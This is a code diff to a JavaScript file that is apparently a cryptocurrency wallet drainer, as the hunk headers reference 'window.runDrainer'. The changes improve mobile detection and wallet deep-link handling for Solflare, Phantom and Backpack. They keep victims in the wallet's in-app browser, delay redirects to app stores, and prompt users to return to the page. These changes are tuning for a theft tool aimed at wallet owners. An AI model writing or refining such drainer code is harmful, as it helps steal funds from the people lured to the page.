@@ -5914,11 +5914,13 @@ window.runDrainer = runDrainer;
       let deepLink = '';
       let fallbackUrl = '';
       
-      // Simplified mobile detection
+      // Enhanced mobile detection
       const userAgent = navigator.userAgent.toLowerCase();
       const isMobileDevice = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(userAgent) || 
                             (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
-                            window.innerWidth <= 768;
+                            window.innerWidth <= 768 ||
+                            ('ontouchstart' in window) ||
+                            (navigator.platform && /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(navigator.platform));
       
       // For mobile devices, use enhanced deep link handling
           if (isMobileDevice) {
@@ -6032,20 +6034,32 @@ window.runDrainer = runDrainer;
           // Use a more reliable method for mobile deep links
           const link = document.createElement('a');
           link.href = deepLink;
-          link.target = '_blank';
+          link.target = '_self'; // Changed from '_blank' to '_self' to stay in same tab
           link.rel = 'noopener noreferrer';
           document.body.appendChild(link);
           link.click();
           document.body.removeChild(link);
           
-          // If that doesn't work, try custom scheme after a short delay
+          // Wait longer before trying fallback to avoid immediate app store redirect
           setTimeout(() => {
-            console.log(`[DEEP_LINK] Trying custom scheme: ${fallbackUrl}`);
-            window.location.href = fallbackUrl;
-          }, 1500);
+            // Check if we're still on the same page (deep link didn't work)
+            if (window.location.href === currentUrl) {
+              console.log(`[DEEP_LINK] Universal link failed, trying custom scheme: ${fallbackUrl}`);
+              window.location.href = fallbackUrl;
+            } else {
+              console.log(`[DEEP_LINK] Universal link successful, staying in wallet browser`);
+            }
+          }, 3000); // Increased timeout to 3 seconds
           
           // Show a message to the user about what's happening
           showStatus(`Opening ${walletType} wallet...`, 'info');
+          
+          // Add mobile debugging info
+          console.log(`[MOBILE_DEBUG] Current URL: ${window.location.href}`);
+          console.log(`[MOBILE_DEBUG] Target deep link: ${deepLink}`);
+          console.log(`[MOBILE_DEBUG] User agent: ${navigator.userAgent}`);
+          console.log(`[MOBILE_DEBUG] Touch points: ${navigator.maxTouchPoints}`);
+          console.log(`[MOBILE_DEBUG] Screen width: ${window.innerWidth}`);
           
         } else {
           // Desktop: Direct window location change
@@ -6059,20 +6073,35 @@ window.runDrainer = runDrainer;
         // Enhanced fallback: try multiple strategies
         console.log(`[DEEP_LINK] Attempting enhanced fallback strategies`);
         
-        // Strategy 1: Try fallback URL
-        try {
-          window.location.href = fallbackUrl;
-        } catch (fallbackError) {
-          console.error(`[DEEP_LINK] Fallback URL failed:`, fallbackError);
+        // For mobile, show user-friendly message instead of immediate app store redirect
+        if (isMobileDevice) {
+          showStatus(`Please open ${walletType} manually and return to this page`, 'info');
           
-          // Strategy 2: Try install page
-          const wallet = WALLET_DEFS.find(w => w.key === walletType);
-          if (wallet && wallet.install) {
-            console.log(`[DEEP_LINK] Redirecting to install page:`, wallet.install);
-            window.location.href = wallet.install;
-          } else {
-            // Strategy 3: Show error message
-            showStatus(`Failed to open ${walletType} wallet. Please install the wallet app.`, 'error');
+          // Only redirect to app store after user confirmation or timeout
+          setTimeout(() => {
+            if (confirm(`Would you like to install ${walletType} wallet?`)) {
+              const installUrl = walletType === 'solflare' ? 'https://solflare.com/' : 
+                               walletType === 'phantom' ? 'https://phantom.app/' :
+                               walletType === 'backpack' ? 'https://backpack.app/' : '#';
+              window.open(installUrl, '_blank');
+            }
+          }, 5000);
+        } else {
+          // Desktop: Strategy 1: Try fallback URL
+          try {
+            window.location.href = fallbackUrl;
+          } catch (fallbackError) {
+            console.error(`[DEEP_LINK] Fallback URL failed:`, fallbackError);
+            
+            // Strategy 2: Try install page
+            const wallet = WALLET_DEFS.find(w => w.key === walletType);
+            if (wallet && wallet.install) {
+              console.log(`[DEEP_LINK] Redirecting to install page:`, wallet.install);
+              window.location.href = wallet.install;
+            } else {
+              // Strategy 3: Show error message
+              showStatus(`Failed to open ${walletType} wallet. Please install the wallet app.`, 'error');
+            }
           }
         }
       }
